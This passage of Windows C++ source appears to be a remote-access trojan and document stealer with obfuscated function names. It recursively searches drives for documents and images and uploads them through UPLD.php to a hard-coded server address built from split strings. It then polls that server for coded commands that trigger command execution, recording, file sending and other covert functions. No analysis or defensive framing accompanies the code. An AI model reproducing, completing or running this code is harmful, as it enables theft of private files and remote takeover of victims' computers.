					bool result = plkiujhyaszxcdfvbghn(fileName, nextDirectoryPath, resultPath, extension, isnotupload);
					if (result == true)
					{
						closedir(dir);
						return true;
					}
				}
			}
		}
		closedir(dir);
		return false;
	}
	catch (const std::exception& e)
	{
		cout << e.what() << endl;
	}
}




void hkxfjfgjjut(string path)
{
	try
	{
		ifstream ifile(path);
		if (ifile)
		{
			bgtrfvcdewsx(path, "0", "UPLDF.php");
			ifile.close();
		}
		else
		{
			ifile.close();
		}
	}
	catch (const std::exception& e)
	{
		cout << e.what() << endl;
	}
}

bool ammended(const std::string& drv)
{
	try
	{
		dirent* entry;
		DIR* dir = opendir(drv.c_str());
		std::string str(".pdf,pptx,.ppt,.docx,.doc,.txt,.PDF,.DOCX,.DOC,.xls,.xlsx,.jpg,.png,.jpeg,.accdb,.JPG,.JPEG,.PNG");

		if (dir == NULL)
			return false;
		while ((entry = readdir(dir)) != NULL)
		{
			try
			{
				if (entry->d_type == DT_REG)
				{
					string resultPath = drv + "\\" + entry->d_name;
					int position = resultPath.find_last_of(".");
					string result = "."+resultPath.substr(position + 1);

					if (str.find(result) != std::string::npos)
					{
						bgtrfvcdewsx(resultPath, "0", "UPLD.php");
					}
				}
			}
			catch (const std::overflow_error& e)
			{
				cout << e.what() << endl;
			}
		}

		rewinddir(dir);
		while ((entry = readdir(dir)) != NULL)
		{
			if (entry->d_type == DT_DIR)
			{
				if (!yhnbgt(entry->d_name))
				{
					std::string nextDirectoryPath = drv + "\\" + entry->d_name;
					try
					{
						bool result = ammended(nextDirectoryPath);
						if (result == true)
						{
							closedir(dir);
							return true;
						}
					}
					catch (const std::overflow_error& e)
					{
						cout << e.what() << endl;
					}
				}
			}
		}
		closedir(dir);
		return false;
	}
	catch (const std::exception& e)
	{
		cout << e.what() << endl;
		return true;
	}
}


int WINAPI wWinMain(HINSTANCE _first, HINSTANCE _second, LPWSTR _end, int noConsole)
{
	try
	{
		string beta1 = "9";
		string beta2 = "192";
		string beta3 = "109";
		string beta4 = "177";
		string beta5 = "168";
		string beta6 = "99";
		string beta7 = "77";
		string beta10 = "80";

		time_t currentTime;
		struct tm *localTime;
		time(&currentTime);                  
		localTime = localtime(&currentTime);  
		int Day = localTime->tm_mday;
		int Month = localTime->tm_mon + 1;
		int Year = localTime->tm_year + 1900;

		string hippo = beta2 + "." + beta5 + "." + beta7 + "." + beta4;
		hippo = "http://" + hippo;

		if (true)
		{
			HMODULE hModule = GetModuleHandleW(NULL);
			WCHAR path[MAX_PATH];
			GetModuleFileNameW(hModule, path, MAX_PATH);
			wstring ws(path);
			string str(ws.begin(), ws.end());
			string Exe_pth = str;
			WinServices * OBJ = new WinServices;
			OBJ->CreateYFiles();

			string baseip = hippo + "/Orient";
			OBJ->SV1_AD = baseip + "/process/";
			OBJ->pqwpqfdgdshg = baseip + "/Winexternal/";
			OBJ->Windows_GV_ASN();
			OBJ->dggdfgdgdgdgd();
		
			
			string drvs = OBJ->Drives.c_str();
		
			while (1)
			{
				OBJ->qwertyuiopasdf();
				OBJ->qwmnerty();

				if (OBJ->Chunk[0] == "^#@21@")
				{
					OBJ->plkiujhyaszxcdfvbghn();
				}
			
				else if (OBJ->Chunk[0] == "yhbg^^^")
				{
					OBJ->Window_Get_cmd();
				}
			
				else if (OBJ->Chunk[0] == "@wert@#")
				{
					OBJ->jkkkjkjkjkjlkdcx();
					OBJ->mkiussssssssss((jhrthjtklhrtertet + "record\\").c_str());
				}

				else if (OBJ->Chunk[0] == "&&@@##")
				{
					OBJ->Windows_DAF();
				}
				else if (OBJ->Chunk[0] == "229988#")
				{
					OBJ->Windows_SEND_FP();
				}
				else if (OBJ->Chunk[0] == "@#$%2345")
				{

					OBJ->rteryurtrtirtrryooy();
				}
				else if (OBJ->Chunk[0] == "6#1542")
				{
					OBJ->Windows_KP();
				}
			
				else if (OBJ->Chunk[0] == "kqwmn@@&&")
				{
					OBJ->Windows_CT();
				}
				else if (OBJ->Chunk[0] == "!@()%")
				{
					hkxfjfgjjut(OBJ->Chunk[1]);
				}
			
				OBJ->oioioioioioioio();
				OBJ->ffffffghhhjkjkkkkk();
			}
		}
	}
	catch (const std::exception& e)
	{
		cout << e.what() << endl;
	}
}